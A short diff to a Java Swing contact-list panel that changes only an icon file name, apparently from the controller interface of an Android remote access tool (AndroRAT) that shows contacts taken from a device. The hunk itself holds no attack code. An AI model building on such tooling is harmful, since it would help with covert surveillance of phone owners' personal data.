@@ -376,7 +376,7 @@ public class ContactPanel extends JPanel {
 					values[ptr] = contact.getPhones().get(0) + " - "+ contact.getDisplay_name() + " (id:"+ contact.getId() + ")";
 					
 					JLabel lbl = new JLabel(contact.getPhones().get(0) + " - "+ contact.getDisplay_name() + " (id:"+ contact.getId() + ")");
-					lbl.setIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(UserGUI.class.getResource("/gui/res/androrat_logo_32pix.png"))));
+					lbl.setIcon(new ImageIcon(Toolkit.getDefaultToolkit().getImage(UserGUI.class.getResource("/gui/res/AndoidRAT_logo_32pix.png"))));
 				}
 				ptr++;
 			}
